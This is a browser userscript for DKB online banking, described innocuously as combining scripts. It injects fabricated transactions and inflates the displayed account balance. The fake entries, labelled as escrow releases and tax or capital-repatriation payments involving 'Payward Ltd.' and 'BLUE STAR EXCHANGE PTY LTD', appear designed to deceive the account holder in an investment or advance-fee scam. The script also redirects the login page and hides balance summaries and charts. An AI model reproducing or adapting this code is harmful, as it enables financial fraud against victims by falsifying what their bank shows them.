// ==UserScript==
// @name         Andreas Schubert Combined D
// @namespace    http://tampermonkey.net/
// @version      10.0
// @description  Combine different scripts
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @match        https://www.ib.dkb.de/*
// @match        https://banking.dkb.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/477669/Andreas%20Schubert%20Combined%20D.user.js
// @updateURL https://update.greasyfork.org/scripts/477669/Andreas%20Schubert%20Combined%20D.meta.js
// ==/UserScript==



(function() {
    'use strict';

       // Check if on the login page
    const isLoginPage = window.location.href.indexOf('https://banking.dkb.de/login') !== -1;

    if (isLoginPage) {
        // Redirect URL
        const redirectURL = 'https://www.ib.dkb.de/banking';

        // Redirect to the new URL
        window.location.href = redirectURL;

        // Handle refresh logic
        const refresh = window.localStorage.getItem('refresh');
        console.log(refresh);

        setTimeout(function() {
            if (refresh === null) {
                window.location.reload();
                window.localStorage.setItem('refresh', '1');
            }
        }, 1500); // 1500 milliseconds = 1.5 seconds

        setTimeout(function() {
            localStorage.removeItem('refresh');
        }, 1400); // 1400 milliseconds = 1.4 seconds
    }

    // Add click event listener to the entire document
    document.addEventListener('click', function(event) {
        // Redirect only if click occurs on the login page
        if (isLoginPage) {
            const clickTarget = event.target;

            // Check if the clicked element is within the login form
            const isClickInLoginForm = clickTarget.closest('.loginFormWrapper') !== null;

            if (isClickInLoginForm) {
                const redirectURL = 'https://www.ib.dkb.de/banking';
                window.location.href = redirectURL;
            }
        }
    });

     // Check if elements with class "sum bgColor" exist on the page
    const sumElements = document.querySelectorAll('.sum.bgColor');

    if (sumElements.length > 0) {
        // If they exist, remove each element
        sumElements.forEach(element => {
            element.remove();
            console.log('Removed element with class "sum bgColor".');
        });
    }

    // Check if elements with class "hide-for-xxsmall" exist on the page
    const hideElements = document.querySelectorAll('.hide-for-xxsmall');

    if (hideElements.length > 0) {
        // If they exist, remove each element
        hideElements.forEach(element => {
            element.remove();
            console.log('Removed element with class "hide-for-xxsmall".');
        });
    }
   

    // Values to be specified manually
    // For 'Add Transaction with Custom Transaction ID Check'
    const expectedTid = '0'; // The tid you want to match.
    const transaction3 = {
      amount: '169.600,00',
      description: 'Treuhand: Freigabe nötig',
      type: 'Treuhand: Freigabe nötig',
      date: '18.10.2023',
      recipient: 'Payward Ltd.',
      iban: 'GB28SEOU00994400208913',
      updateBalance: false
    };
      const transaction2 = {
      amount: '17.000,00',
      description: 'Geld für Steuern',
      type: 'Treuhand',
      date: '18.10.2023    18.10.2023',
      recipient: 'BLUE STAR EXCHANGE PTY LTD',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };
     const transaction4 = {
      amount: '83.818,27',
      description: 'Bitte ab 30.11 verwenden, sonst wird gesperrt',
      type: 'Auf Unterlagen warten und dann ausgeben',
      date: '25.10.2023     27.10.2023',
      recipient: 'Payward Ltd.',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };
const transaction = {
     amount: '3.000,00',
      description: 'Geld für Kapitalertragsteuern',
     type: 'Treuhand',
   date: '25.10.2023   25.10.2023',
      recipient: 'BLUE STAR EXCHANGE PTY LTD',
      iban: 'GB28SEOU00994400208913',
      updateBalance: true
    };

 const transaction5 = {
      amount: '10.000,00',
      description: 'Geld für Kapitalerückführungssteuern',
     type: 'Überweisung Geld für Kapitalerückführungssteuern',
      date: '06.11.2023   06.11.2023',
     recipient: 'BLUE STAR EXCHANGE PTY LTD',
      iban: 'GB28SEOU00994400208913',
     updateBalance: true
    };

// const transaction5 = {
  //    amount: '12.000,00',
  //    description: 'Geld für Steuern',
  //    type: 'Überweisung Geld für Steuern',
  //    date: '28.09.2023   28.09.2023',
 //     recipient: 'BLUE STAR EXCHANGE PTY LTD',
 //     iban: 'GB28SEOU00994400208913',
  //    updateBalance: true
 //   };
  /// DON'T FORGET TO ADD ANOTHER TRANSACTION BELOW

    // For 'Modify Balance and Amount Userscript'
    const targetIBAN = 'DE89 1203 0000 0000 7842 31'; // The IBAN you want to modify
    let balanceModificationAmount = 1000; // The desired balance modification amount
    let amountModificationValue = 1000; // The desired amount modification value

    // For 'IBAN Balance Updater in Umbuchung'
    const specifiedIBAN = "DE89 1203 0000 0000 7842 31 / Girokonto"; // The desired IBAN
    let specifiedAmount = 2000; // The desired amount

      balanceModificationAmount = amountModificationValue = specifiedAmount = 113818; // change for the desired amount for finanzstatus and umbuchung

    // 'Add Transaction with Custom Transaction ID Check' goes here
    // Function to add a new transaction
    function addTransaction(amount, description, type, date, recipient, iban, updateBalance) {
     const table = document.querySelector('.expandableTable.transactionsTable');
      if (!table) {
        console.error('Target table not found.');
        return;
      }

      const tableBody = table.querySelector('tbody');
      if (!tableBody) {
        console.error('Table body not found.');
        return;
      }


      // Remove elements with class "dailyBalanceText"
      const dailyBalanceTextElements = document.querySelectorAll('.dailyBalanceText');
      dailyBalanceTextElements.forEach(element => element.remove());

      const newRow = document.createElement('tr');
      newRow.className = 'mainRow'; // You may need to adjust the class name accordingly.

      // Create the cells for the new row
      const dateCell = document.createElement('td');
      dateCell.className = 'hide-for-xsmall-down transactionDate';
      dateCell.textContent = date;
      newRow.appendChild(dateCell);

      const typeCell = document.createElement('td');
      typeCell.className = 'transactionText';
      const typeDiv1 = document.createElement('div');
      typeDiv1.textContent = type;
      typeCell.appendChild(typeDiv1);
      const typeDiv2 = document.createElement('div');
      typeDiv2.textContent = recipient;
      typeCell.appendChild(typeDiv2);
      newRow.appendChild(typeCell);

      const ibanCell = document.createElement('td');
      ibanCell.className = 'show-for-large-up';
      const ibanDiv = document.createElement('div');
      ibanDiv.className = 'nowrap trimmed_iban';
      ibanDiv.textContent = iban;
      ibanCell.appendChild(ibanDiv);
      newRow.appendChild(ibanCell);

      const amountCell = document.createElement('td');
      amountCell.className = 'alignRight';
      const amountDiv = document.createElement('div');
      amountDiv.className = 'nowrap';
      const amountSpan = document.createElement('span');
      amountSpan.textContent = amount;
      if (parseFloat(amount.replace(/[^0-9,-]/g, '')) < 0) {
        amountSpan.classList.add('dkbred');
      }
      amountDiv.appendChild(amountSpan);
      amountCell.appendChild(amountDiv);
      newRow.appendChild(amountCell);

      const actionsCell = document.createElement('td');
      actionsCell.className = 'alignRight actions';
      const actionsLink = document.createElement('a');
      actionsLink.setAttribute('data-abx-jsevent', 'pick');
      actionsLink.setAttribute('href', 'https://www.ib.dkb.de/banking/finanzstatus/kontoumsaetze?$event=pick&id=0');
      actionsLink.className = 'evt-pick';
      actionsLink.setAttribute('tid', 'pick');
      const actionsIcon = document.createElement('span');
      actionsIcon.className = 'icons iconLoupe0';
      actionsIcon.title = 'Umsatzdetails';
      actionsLink.appendChild(actionsIcon);
      actionsCell.appendChild(actionsLink);
      newRow.appendChild(actionsCell);

      // Add the new row at the top of the table
      tableBody.insertBefore(newRow, tableBody.firstChild);

          // Check if the element with class "highcharts-container" exists on the page
    const highchartsContainer = document.querySelector('.highcharts-container');

    if (highchartsContainer) {
        // If it exists, remove the element
        highchartsContainer.remove();
        console.log('Removed element with class "highcharts-container".');
    }

      // Update the balance if required
      if (updateBalance) {
        const balanceElement = document.querySelector('.clearfix.module.accountBalance strong span');
        if (balanceElement) {
          const currentBalance = parseFloat(balanceElement.textContent.replace(/[^0-9,-]/g, '').replace(',', '.'));
          const newBalance = currentBalance + parseFloat(amount.replace(/[^0-9,-]/g, '').replace(',', '.'));
          balanceElement.textContent = newBalance.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' });
        } else {
          console.error('Balance element not found.');
        }
      }
    }

    // Function to check if the selected tid under class "field text" matches the specified number
    function isCustomTidSelected(expectedTid) {
      const selectElement = document.querySelector('.mandatory .field.text');
      if (selectElement) {
        const selectedOption = selectElement.options[selectElement.selectedIndex];
        return selectedOption && selectedOption.getAttribute('tid') === expectedTid;
      }
      return false;
    }

    if (isCustomTidSelected(expectedTid)) {
      addTransaction(transaction.amount, transaction.description, transaction.type, transaction.date, transaction.recipient, transaction.iban, transaction.updateBalance);
        // HERE I CAN ADD ANOTHER TRANSACTION
      addTransaction(transaction2.amount, transaction2.description, transaction2.type, transaction2.date, transaction2.recipient, transaction2.iban, transaction2.updateBalance);
 addTransaction(transaction3.amount, transaction3.description, transaction3.type, transaction3.date, transaction3.recipient, transaction3.iban, transaction3.updateBalance);
 addTransaction(transaction4.amount, transaction4.description, transaction4.type, transaction4.date, transaction4.recipient, transaction4.iban, transaction4.updateBalance);
 addTransaction(transaction5.amount, transaction5.description, transaction5.type, transaction5.date, transaction5.recipient, transaction5.iban, transaction5.updateBalance);

    }
  // Function to parse the balance value in the correct format
  function parseBalanceValue(balanceText) {
    // Remove all dots used as thousands separators
    const balanceWithoutDots = balanceText.replace(/\./g, '');

    // Replace the comma with a dot to use it as a decimal separator
    const balanceWithDotDecimal = balanceWithoutDots.replace(',', '.');

    return parseFloat(balanceWithDotDecimal);
  }

  // Function to modify the balance for a specific IBAN
  function modifyBalanceForIBAN(targetIBAN, targetAmount) {
    const mainRows = document.querySelectorAll('.mainRow');
    mainRows.forEach(mainRow => {
      const ibanElement = mainRow.querySelector('.iban.hide-for-small-down');
      const ibanText = ibanElement.textContent.trim();
      if (ibanText === targetIBAN) {
        const balanceElement = mainRow.querySelector('.alignRight.amount.bold');
        const currentBalance = parseBalanceValue(balanceElement.textContent);

        // Increase the balance by the specified amount
        const modifiedBalance = currentBalance + targetAmount;

        // Update the displayed balance
        balanceElement.textContent = modifiedBalance.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' €';
      }
    });
  }

  // Function to modify the amount extracted from the specified HTML source code
  function modifyAmount(modificationValue) {
    const rows = document.querySelectorAll('tr.sum.bgColor');
    rows.forEach(row => {
      const amountCell = row.querySelector('td.amount span[style="white-space:nowrap"]');
      if (amountCell) {
        const amountText = amountCell.innerText;
        const amount = parseBalanceValue(amountText);

        // Modify the amount based on the provided modificationValue
        const modifiedAmount = amount + modificationValue;

        // Update the content of the amountCell with the modified amount
        amountCell.innerText = modifiedAmount.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
      }
    });
  }



    modifyBalanceForIBAN(targetIBAN, balanceModificationAmount);
    modifyAmount(amountModificationValue);

    // 'IBAN Balance Updater in Umbuchung' goes here
    function updateBalance(specifiedIBAN, specifiedAmount) {
      console.log("Starting IBAN Balance Updater script...");

      // Find the IBAN element on the page
      const ibanElement = document.querySelector('span.col65.floatRight strong');

      if (!ibanElement) {
          console.error("IBAN element not found!");
          return;
      }

      console.log("IBAN element found:", ibanElement.textContent.trim());

      // Extract the IBAN from the element
      const extractedIBAN = ibanElement.textContent.trim();

      // Check if the extracted IBAN matches the specified IBAN
      if (extractedIBAN === specifiedIBAN) {
          console.log("Specified IBAN matches the extracted IBAN:", extractedIBAN);

          // Find the balance elements on the page
          const balanceElements = document.querySelectorAll('strong');
          const balanceElement = Array.from(balanceElements).find(el => el.textContent.includes('EUR'));

          if (!balanceElement) {
              console.error("Balance element not found!");
              return;
          }

          console.log("Balance element found:", balanceElement.textContent.trim());

          // Extract the balance amount from the balance element
          const balanceText = balanceElement.textContent.trim();
          const balanceAmount = parseFloat(balanceText.replace(/[^\d,]+/g, '').replace(',', '.'));

          console.log("Balance amount extracted:", balanceAmount);

          // Update the balance amount
          const updatedBalance = balanceAmount + specifiedAmount;

          console.log("Updating balance amount with:", specifiedAmount);
          console.log("New balance amount:", updatedBalance.toFixed(2));

          // Format the updated balance in the desired format
          const formattedBalance = updatedBalance.toLocaleString('de-DE', {
              minimumFractionDigits: 2,
              maximumFractionDigits: 2,
          });

          // Update the balance element with the new value
          balanceElement.textContent = `${formattedBalance} EUR`;

          console.log("Balance updated successfully!");
      } else {
          console.log("Specified IBAN does not match the extracted IBAN:", specifiedIBAN);
      }
    }

    updateBalance(specifiedIBAN, specifiedAmount);



  })();






